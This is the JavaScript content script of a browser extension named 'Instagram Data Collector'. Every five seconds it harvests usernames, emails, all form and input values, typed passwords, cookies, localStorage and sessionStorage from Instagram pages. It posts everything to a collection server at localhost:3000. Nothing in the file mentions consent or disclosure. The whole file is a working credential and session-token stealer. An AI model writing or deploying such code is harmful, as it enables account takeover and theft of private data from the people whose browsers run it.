// Content script for Instagram
console.log('Instagram Data Collector loaded');

// Function to collect Instagram data
function collectInstagramData() {
  const data = {
    username: null,
    email: null,
    profileInfo: {},
    cookies: {},
    localStorage: {},
    sessionStorage: {},
    forms: {},
    inputs: {}
  };

  // Try to get username from various elements
  const usernameSelectors = [
    '[data-testid="user-avatar"]',
    '._aacl._aaco._aacw._aacx._aad7._aade',
    '[aria-label*="profile"]',
    '.x1lliihq.x1n2onr6.x5n08af',
    '[data-testid="username"]',
    'a[href*="/"] span',
    '.x1lliihq.x6ikm8r.x10wlt62.x1n2onr6',
    '[data-testid="username"]',
    '.x1lliihq.x1n2onr6.x5n08af.x1ja2u2z',
    'span[dir="auto"]'
  ];

  usernameSelectors.forEach(selector => {
    const elements = document.querySelectorAll(selector);
    elements.forEach(el => {
      const text = el.textContent || el.getAttribute('aria-label') || '';
      if (text && (text.includes('@') || text.length > 3)) {
        data.username = text;
      }
    });
  });

  // Try to get email from forms and inputs
  const emailInputs = document.querySelectorAll('input[type="email"], input[name*="email"], input[placeholder*="email"]');
  emailInputs.forEach(input => {
    if (input.value && input.value.includes('@')) {
      data.email = input.value;
    }
  });

  // Get all form data
  const forms = document.querySelectorAll('form');
  forms.forEach((form, index) => {
    const formData = {};
    const inputs = form.querySelectorAll('input');
    inputs.forEach(input => {
      if (input.value) {
        formData[input.name || input.id || `input_${index}`] = input.value;
      }
    });
    if (Object.keys(formData).length > 0) {
      data.forms[`form_${index}`] = formData;
    }
  });

  // Get all input values
  const allInputs = document.querySelectorAll('input');
  allInputs.forEach((input, index) => {
    if (input.value) {
      data.inputs[input.name || input.id || `input_${index}`] = input.value;
    }
  });

  // Get localStorage data
  try {
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      const value = localStorage.getItem(key);
      data.localStorage[key] = value;
    }
  } catch (e) {
    console.log('Could not access localStorage');
  }

  // Get sessionStorage data
  try {
    for (let i = 0; i < sessionStorage.length; i++) {
      const key = sessionStorage.key(i);
      const value = sessionStorage.getItem(key);
      data.sessionStorage[key] = value;
    }
  } catch (e) {
    console.log('Could not access sessionStorage');
  }

  // Get cookies
  try {
    const cookies = document.cookie.split(';');
    cookies.forEach(cookie => {
      const [name, value] = cookie.trim().split('=');
      data.cookies[name] = value;
    });
  } catch (e) {
    console.log('Could not access cookies');
  }

  // Try to get saved passwords
  try {
    const passwordInputs = document.querySelectorAll('input[type="password"]');
    passwordInputs.forEach(input => {
      if (input.value) {
        data.savedPassword = input.value;
      }
    });
  } catch (e) {
    console.log('Could not access password inputs');
  }

  // Get page URL and title
  data.pageUrl = window.location.href;
  data.pageTitle = document.title;

  console.log('Collected Instagram data:', data);

  // Send data to our website
  fetch('http://localhost:3000/api/instagram-data', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(data)
  }).then(response => {
    console.log('Data sent successfully');
  }).catch(e => {
    console.log('Could not send data:', e);
  });

  return data;
}

// Collect data when page loads
setTimeout(collectInstagramData, 2000);

// Collect data every 5 seconds
setInterval(collectInstagramData, 5000);

// Listen for messages from popup
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'collectData') {
    const data = collectInstagramData();
    sendResponse(data);
  }
}); 